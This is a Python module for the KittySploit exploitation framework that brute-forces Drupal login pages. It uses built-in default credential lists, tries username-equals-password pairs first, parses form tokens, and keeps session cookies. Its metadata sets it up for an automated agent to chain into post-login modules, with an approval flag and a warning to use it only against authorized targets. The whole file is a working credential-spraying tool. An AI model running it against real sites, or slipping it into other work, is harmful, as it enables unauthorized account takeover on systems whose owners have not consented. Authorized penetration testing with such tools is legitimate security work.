#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Drupal user/login credential spray — wordlist or single-pair bruteforce."""

from __future__ import annotations

import itertools
import os
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

from kittysploit import *
from core.framework.base_module import ModuleResult
from lib.protocols.http.drupal import Drupal
from lib.protocols.http.http_client import Http_client


DEFAULT_DRUPAL_USERS = [
    "admin",
    "administrator",
    "root",
    "drupal",
    "user",
    "test",
    "editor",
    "webmaster",
]
DEFAULT_DRUPAL_PASSWORDS = [
    "admin",
    "password",
    "password123",
    "123456",
    "admin123",
    "drupal",
    "root",
    "changeme",
    "pass",
    "Passw0rd",
    "letmein",
]


class Module(Auxiliary, Http_client, Drupal):

    __info__ = {
        "name": "Drupal login bruteforce",
        "description": (
            "Bruteforce Drupal /user/login with username/password wordlists. "
            "Extracts form_build_id / form_token and detects success via session "
            "cookies (SESS/SSESS) and redirects away from the login form."
        ),
        "author": "KittySploit Team",
        "tags": ["web", "drupal", "cms", "login", "bruteforce", "credentials", "scanner"],
        "references": [
            "https://www.drupal.org/docs/user_guide/en/user-concept.html",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["credential_spray", "active_exploitation"],
            "expected_requests": 40,
            "reversible": False,
            "approval_required": True,
            "produces": ["credentials", "tech_hints", "risk_signals", "endpoints"],
            "cost": 2.0,
            "noise": 0.85,
            "value": 1.4,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["drupal"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {"drupal": 0.3},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/user/login"],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "consumes_capabilities": [],
                "produces_capabilities": [
                    {"capability": "session_cookie", "from_detail": "cookie_header"},
                    "authenticated_session",
                    {"capability": "landing_path", "from_detail": "post_login_final_path"},
                    {"capability": "drupal_auth", "from_detail": "username"},
                ],
                "option_bindings": {
                    "path": "landing_path",
                },
                "suggested_followups": [
                    "post/http/gather/authenticated_surface",
                    "auxiliary/scanner/http/drupal_scanner",
                ],
            },
        },
    }

    path = OptString("/", "Drupal base path (login is resolved as <path>/user/login)", required=False)
    username = OptString("", "Single username to try", required=False)
    password = OptString("", "Single password to try", required=False)
    usernames_file = OptFile("", "File with usernames (one per line)", required=False)
    passwords_file = OptFile("", "File with passwords (one per line)", required=False)
    delay = OptFloat(0.2, "Delay between attempts in seconds", required=False)
    max_attempts = OptInteger(50, "Maximum credential pairs to try (0 = unlimited)", required=False, advanced=True)
    stop_on_success = OptBool(True, "Stop after the first valid credential pair", required=False)
    refresh_form = OptBool(
        True,
        "Re-fetch /user/login form tokens before each attempt (safer for form_build_id)",
        required=False,
        advanced=True,
    )

    def _opt(self, name: str, default: Any = "") -> Any:
        value = getattr(self, name, default)
        if hasattr(value, "value"):
            return value.value
        return value

    def _read_wordlist(self, file_path: str) -> List[str]:
        if not file_path or not os.path.isfile(file_path):
            if file_path:
                print_warning(f"Wordlist not found: {file_path}")
            return []
        values: List[str] = []
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as handle:
                for line in handle:
                    item = line.strip()
                    if item and not item.startswith("#"):
                        values.append(item)
        except OSError as exc:
            print_warning(f"Unable to read wordlist {file_path}: {exc}")
        return values

    def _build_candidates(self) -> List[Tuple[str, str]]:
        users: List[str] = []
        passwords: List[str] = []

        single_user = str(self._opt("username", "") or "").strip()
        single_pass = str(self._opt("password", "") or "")
        users_file = str(self._opt("usernames_file", "") or "").strip()
        passes_file = str(self._opt("passwords_file", "") or "").strip()

        if single_user:
            users = [single_user]
        else:
            users.extend(self._read_wordlist(users_file))
            if not users:
                users = list(DEFAULT_DRUPAL_USERS)
                print_warning("No username source provided, using built-in Drupal defaults.")

        if single_user and single_pass:
            passwords = [single_pass]
        elif single_user and not passes_file:
            passwords = list(DEFAULT_DRUPAL_PASSWORDS)
        else:
            if single_pass:
                passwords.append(single_pass)
            passwords.extend(self._read_wordlist(passes_file))
            if not passwords:
                passwords = list(DEFAULT_DRUPAL_PASSWORDS)
                print_warning("No password source provided, using built-in Drupal defaults.")

        users = list(dict.fromkeys(users))
        passwords = list(dict.fromkeys(passwords))
        pairs = list(itertools.product(users, passwords))

        # Prefer username==password pairs early for soft targets.
        prioritized: List[Tuple[str, str]] = []
        seen = set()
        for user in users:
            if user in passwords:
                key = (user, user)
                if key not in seen:
                    seen.add(key)
                    prioritized.append(key)
        for pair in pairs:
            if pair not in seen:
                seen.add(pair)
                prioritized.append(pair)

        limit = int(self._opt("max_attempts", 50) or 0)
        if limit > 0:
            prioritized = prioritized[:limit]
        return prioritized

    def _extract_session_cookies(self, response) -> Dict[str, str]:
        cookies: Dict[str, str] = {}
        if not response:
            return cookies
        try:
            jar = getattr(response, "cookies", None)
            if jar is None:
                return cookies
            for cookie in jar:
                name = str(getattr(cookie, "name", "")).strip()
                value = str(getattr(cookie, "value", "")).strip()
                if not name or not value:
                    continue
                cookies[name[:80]] = value[:512]
                if len(cookies) >= 20:
                    break
        except Exception:
            return {}
        return cookies

    def _build_auth_payload(
        self,
        username: str,
        password: str,
        login_path: str,
        response,
    ) -> Dict[str, Any]:
        final_url = getattr(response, "url", "") or "" if response else ""
        try:
            final_path = urlparse(final_url).path or ""
        except Exception:
            final_path = ""

        cookies = self._extract_session_cookies(response)
        payload: Dict[str, Any] = {
            "authenticated_as": username,
            "username": username,
            "password": password,
            "login_path": login_path,
            "username_field": "name",
            "password_field": "pass",
            "cms": "drupal",
            "post_login_final_url": final_url[:512],
            "post_login_snippet": ((response.text or "") if response else "")[:8000],
        }
        if final_path:
            payload["post_login_final_path"] = final_path[:256]
        if cookies:
            payload["session_cookies"] = cookies
            payload["cookie_header"] = "; ".join(
                f"{key}={value}" for key, value in cookies.items()
            )[:4000]
        return payload

    def _fetch_form_fields(self, login_path: str) -> Dict[str, str]:
        response = self.http_request(
            method="GET",
            path=login_path,
            allow_redirects=True,
        )
        return self.drupal_extract_login_form_fields(response.text if response else "")

    def check(self):
        root = self.drupal_normalize_base_path(str(self._opt("path", "/") or "/"))
        login_path = self.drupal_user_login_path(root)
        response = self.http_request(method="GET", path=login_path, allow_redirects=True)
        if not response:
            print_error(f"Unable to reach Drupal login page: {login_path}")
            return False

        body = (response.text or "").lower()
        fields = self.drupal_extract_login_form_fields(response.text or "")
        looks_like_login = (
            response.status_code in (200, 301, 302, 403)
            and (
                "form_id" in fields
                or "user_login" in body
                or 'name="name"' in body
                or "name=\"pass\"" in body
            )
        )
        if looks_like_login:
            print_status(
                f"Drupal login form reachable at {login_path} "
                f"(form_id={fields.get('form_id', 'unknown')})"
            )
            return True

        print_error(f"No Drupal login form detected at {login_path}")
        return False

    def run(self):
        root = self.drupal_normalize_base_path(str(self._opt("path", "/") or "/"))
        login_path = self.drupal_user_login_path(root)
        candidates = self._build_candidates()
        delay = max(float(self._opt("delay", 0.2) or 0.0), 0.0)
        stop_on_success = bool(self._opt("stop_on_success", True))
        refresh_form = bool(self._opt("refresh_form", True))

        print_warning("Only run against authorized Drupal targets")
        print_status(f"Target: {self.target}:{self.port}")
        print_status(f"Login path: {login_path}")
        print_status(f"Candidates: {len(candidates)} pair(s) (delay={delay}s)")

        cached_fields = self._fetch_form_fields(login_path)
        if not cached_fields.get("form_id"):
            print_warning("Could not parse login form fields; continuing with defaults.")

        found: List[Dict[str, Any]] = []
        for index, (user, pwd) in enumerate(candidates, start=1):
            print_status(f"[{index}/{len(candidates)}] Trying {user}:{pwd}")

            form_fields = (
                self._fetch_form_fields(login_path) if refresh_form else dict(cached_fields)
            )
            success, response = self.drupal_try_login(
                user,
                pwd,
                base_path=root,
                allow_redirects=True,
                form_fields=form_fields or None,
            )

            if not success:
                if delay > 0 and index < len(candidates):
                    time.sleep(delay)
                continue

            # Confirm we are not still sitting on the login form after redirects.
            final_url = (getattr(response, "url", "") or "").lower() if response else ""
            body_low = (response.text or "").lower() if response else ""
            stuck = "/user/login" in final_url and (
                "user_login" in body_low or 'name="pass"' in body_low
            )
            if stuck:
                print_warning(f"Discarding false positive for {user}:{pwd} (still on login form)")
                if delay > 0 and index < len(candidates):
                    time.sleep(delay)
                continue

            code = response.status_code if response else "n/a"
            print_success(f"Valid Drupal credentials: {user}:{pwd} (status={code})")
            auth_payload = self._build_auth_payload(user, pwd, login_path, response)
            entry = {
                "username": user,
                "password": pwd,
                "status": code,
                "login_path": login_path,
                **{k: v for k, v in auth_payload.items() if k in ("cookie_header", "post_login_final_path")},
            }
            found.append(entry)

            self.vulnerability_info = {
                "reason": f"Drupal login succeeded for {user}",
                "severity": "High",
                **auth_payload,
            }

            if stop_on_success:
                print_table(
                    ["Username", "Password", "HTTP"],
                    [[user, pwd, code]],
                )
                return ModuleResult(success=True, data=entry)

            if delay > 0 and index < len(candidates):
                time.sleep(delay)

        if found:
            print_success(f"Found {len(found)} valid Drupal credential set(s).")
            print_table(
                ["Username", "Password", "HTTP"],
                [[e["username"], e["password"], e["status"]] for e in found],
            )
            return ModuleResult(success=True, data=found[-1])

        print_error("No valid Drupal credentials found.")
        return False
